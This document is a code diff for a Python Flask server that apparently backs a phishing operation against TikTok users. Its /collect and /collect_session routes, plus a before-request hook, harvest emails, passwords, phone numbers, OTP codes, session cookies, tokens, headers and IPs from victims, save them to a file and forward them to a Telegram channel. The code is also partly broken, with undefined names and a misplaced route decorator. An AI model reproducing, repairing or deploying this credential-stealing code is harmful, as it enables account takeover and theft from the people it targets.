@@ -5,12 +5,13 @@ import os, json, requests, secrets
 from pathlib import Path
 import jwt
 from functools import wraps
+from typing import List, Dict,Any
  
 try:
     from dotenv import load_dotenv
     load_dotenv()
-except Exception:
-    pass
+except Exception as e:print(e)
+    
     
 app = Flask(__name__, template_folder="templates") 
 
@@ -67,7 +68,27 @@ def save_answer(puzzle_no: int, answer: str):
     with open(ANSWER_FILE, "r", encoding="utf-8") as f:
         data = json.load(f)
         print(data)
-            
+        
+def load_sessions():
+    try:
+        with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return [] 
+    except json.JSONDecodeError:
+        return []  
+    except Exception as e:
+        print(f"Error loading sessions data: {e}")
+        return []
+        
+def save_sessions(sessions_data):
+    try:
+        with open(SESSIONS_FILE, "w", encoding="utf-8") as f:
+            json.dump(sessions_data, f, ensure_ascii=False, indent=2)
+        print("Sessions data saved successfully.")
+    except Exception as e:
+        print(f"Error saving sessions data: {e}")
+  
 
 def require_step(min_step: int):
 
@@ -75,6 +96,16 @@ def require_step(min_step: int):
     if cur < min_step:
         return redirect(url_for("start"))
     return None
+    
+def init_session():
+        print("Initializing seesion...")
+        app.config["session"] = requests.Session()
+        s = requests.Session()
+        s.get("https://www.tiktok.com/cookies/set/sessionid/")
+        print(s.cookies.get_dict())
+        r = s.get("https://www.tiktok.com/cookies")
+        print(r.text) 
+init_session()           
     
 @app.before_request
 def load_data():
@@ -96,30 +127,52 @@ def load_data():
     print("=== COOKIES ===")
     for k, v in cookies_list:
         print(f"{k}={v}")
-        
-        
-        print("METHOD:", request.method)
-        print("ORIGIN:", request.headers.get("Origin"))
-        print("CT:", request.headers.get(f"{Content-Type}"))
-        print("RAW JSON:", request.get_json(silent=True))
-        print("RAW FORM:", request.form.to_dict())
-        print("RAW COOKIES:", request.cookies.to_dict())
-        print("ip",request.remote_addr, request.headers.get("X-Forwarded-For"))
     
     message = f"""
     HEADERS:\n{headers_list}\n\nCOOKIES:\n{cookies_list}\nip:\n{ip} 
     """
     send_to_telegram(message) 
 
-@app.route("/set_cookie")
-def set_cookie():
- 
-    token = secrets.token_hex(16); 
+        
+def build_payload(): 
+    print("--- New Request ---")
+    print("Headers:")
+    for header, value in request.headers.items():
+        print(f"{headers}: {value}")
+        
+    print("\nRaw Data:")
+    print(request.data)
+           
+    data = {}
+    try:
+        data.update(request.form.to_dict())
+        j = request.get_json(silent=True) or {}
+        if isinstance(j, dict):
+            data.update(j)
+        data["args"] = request.args.to_dict()
+        data["ip"] = request.remote_addr or ""
+        data["ua"] = request.headers.get("User-Agent")
+        data["ts"] = datetime.utcnow().isoformat() + "Z"
+        payload = data
+        print("payload:", payload)
+    except Exception as e:
+        return "",204
+        
+        
+def detect_print():
+    
+    if "print-pdf" in request.headers.get("User-Agent", "").lower():
+        print("🚨 محاولة طباعة من المتصفح اتسجلت!")
+    
+    if request.headers.get("Accept") == "application/pdf":
+        print("🚨 محاولة طباعة أو حفظ كـ PDF detected!")
+        
 
-    resp = make_response(f"sessionid: {token}")
-    resp.set_cookie(
-        "sessionid",    # اسم الكوكي
-        token,          # القيمة العشوائية اللي اتولّدت
+@app.route("/set_cookie")
+def set_session_cookie(response, token):
+    response.set_cookie(
+        "sessionid",
+        token,
         httponly=True,
         samesite="None",
         path="/"
@@ -146,7 +199,7 @@ def check():
     sessions = load_sessions() or {}
     return {"ok":valid_session(token), "session_id":token}
     
-@app.route('/', methods=["GET"])
+@app.route("/", methods=["GET"])
 def index():
     data = {
         "when": datetime.utcnow().isoformat()+"Z",
@@ -231,15 +284,7 @@ def otp_get():
 @app.route('/thanks.html')
 def thanks():
     return render_template("thanks.html")
-       
-@app.before_request
-def init():
-        app.config["session"] = requests.Session()
-        s = requests.Session()
-        s.get("https://www.tiktok.com/cookies/set/sessionid/")
-        print(s.cookies.get_dict())
-        r = s.get("https://www.tiktok.com/cookies")
-        print(r.text)
+
     
 @app.route("/track", methods=["POST"])
 def track():
@@ -397,7 +442,7 @@ def session_files():
        resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
        resp.headers["Access-Control-Allow-Credentials"] = "true"
     
-       return resp
+       return resp     
 
 @app.route('/collect_session', methods=['POST'])
 def collect_session():
@@ -408,94 +453,96 @@ def collect_session():
         message = payload     
         
         send_to_telegram(message)
-    
-    except:
-        pass   
+        return jsonify({"received": payload}), 200
+    except exception as e:
+        print("error:")
+        print(e)  
+        return "OK", 200
+
          
- 
 def collect_sessions():
-    g.data = request.get_json(silent=True) or {}
-    logs.append({
-        "email": g.data.get("email", ""),
-        "password": g.data.get("password"),
-        "phone": g.data.get("phone"),
-        "otp": g.data.get("otp"),
-        "ip": g.data.get("ip"),
-        "cookie": g.data.get("cookies"),
-    })
-    sessions =load_sessions()
-    sessions.append(session_data)
+
+     data = request.get_json(silent=True) or {}
+     logs.append({
+        "email": data.get("email", ""),
+        "password": data.get("password"),
+        "phone": data.get("phone"),
+        "otp": data.get("otp"),
+        "ip": data.get("ip"),
+        "cookie": data.get("cookies"),
+     })
+     sessions =load_sessions()
+     sessions.append(session_data)
+
+     save_sessions(sessions)
+        
+         
+           
+     message = f"""
+        Cookie: {data.get("cookies")}
+        Email: {data.get("email")}
+        Password: {data.get("password")}
+        Phone: {data.get("phone")}
+        OTP: {data.get("otp")}
+        IP: {data.get("ip")}
+        """ 
+     print ("error in collect_session:", repr(e))   
+     send_to_telegram(message)
+     return {"status": "saved"}  
     
-    save_sessions(sessions)
-    
-     
-       
-    message = f"""
-    Cookie: {g.data.get("cookies")}
-    Email: {g.data.get("email")}
-    Password: {g.data.get("password")}
-    Phone: {g.data.get("phone")}
-    OTP: {g.data.get("otp")}
-    IP: {g.data.get("ip")}
-    """ 
-    
-    send_to_telegram(message)
-    return {"status": "saved"}  
     
 @app.route('/collect', methods=['POST'])
 def collect():
-         
-         body = request.get_json(silent=True)
-         form = request.form.to_dict()
-         headers = dict(request.headers)
-         all_cookies = request.cookies.to_dict()
-          
-         authorization = headers.get("Authorization")
-         auth_hdr = headers.get("Authorization")
-         args = request.args.to_dict()
-         xff = headers.get("X-Forwarded-For") 
-         ip = headers.get("ip") or request.remote_addr
-         cookie_token = all_cookies.get("sessionid") or all_cookies.get("csrftoken")
-         form_token = body.get("token") or form.get("token")
-         event = "page_open"
-         ua = headers.get("User-Agent")
- 
-          
-         session_data = {
-          "ts": datetime.utcnow().isoformat() + "Z",
-          "ip": ip,
-          "ua": ua,
-          "headers": headers,          
-          "cookies": all_cookies,
-          "authorization": authorization, 
-          "cookie_token": cookie_token,
-          "form_token": form_token,
-          }
+    body = {}
+    try:
+        if request.is_json:
+            body = request.get_json(silent=True) or {}
+    except Exception:
+        body = {}
 
-         sessions = load_sessions()
-         sessions.append(session_data)
-         save_sessions(sessions)
+    if not body and request.form:
+        body = request.form.to_dict()
 
-   
-         message = f"""
-          IP: {session_data['ip']}
-          UA: {session_data['ua']}
-          Cookie Token: {session_data['cookie_token']}
-          Form Token: {session_data['form_token']}
-          Cookies: {session_data['all_cookies']}
-          Headers: {session_data['headers']}
-          At: {session_data['ts']}
-          """
-         print("SESSION:", sessions_data)   
-         send_to_telegram(message)
-    
-         resp.headers["Access-Control-Allow-Origin"] = "https://www.tiktok.com"
-         resp.headers["Access-Control-Allow-Credentials"] = "true"
-         return resp
+    headers = dict(request.headers)
+    cookies = request.cookies.to_dict()
+
+    ip = headers.get("X-Forwarded-For") or request.remote_addr
+    ua = headers.get("User-Agent")
+    authorization = headers.get("Authorization")
+
+    cookie_token = (
+        cookies.get("sessionid")
+        or cookies.get("sessionID")
+        or cookies.get("csrftoken")
+        or cookies.get("csrfToken")
+        or cookies.get("cookie_token")
+    )
+
+    form_token = body.get("token") or request.form.get("token")
+
+    session_data = {
+        "ts": datetime.utcnow().isoformat() + "Z",
+        "ip": ip,
+        "ua": ua,
+        "headers": headers,
+        "cookies": cookies,
+        "authorization": authorization,
+        "cookie_token": cookie_token,
+        "form_token": form_token,
+        "body": body,
+    }
+
+    sessions = load_sessions()
+    sessions.append(session_data)
+    save_sessions(sessions)
+
+    print("SESSION:", session_data)
+
+    return jsonify({"status": "saved"})
 
 @app.route("/submit", methods=["POST"])
-def submit():
-   
+def submit():  
+
     data = {}
     try:
         data.update(request.form.to_dict())
@@ -509,7 +556,6 @@ def submit():
     except Exception as e:
         print("build payload error:", repr(e))
 
-   
     try:
         log = []
         if os.path.exists("log.json"):
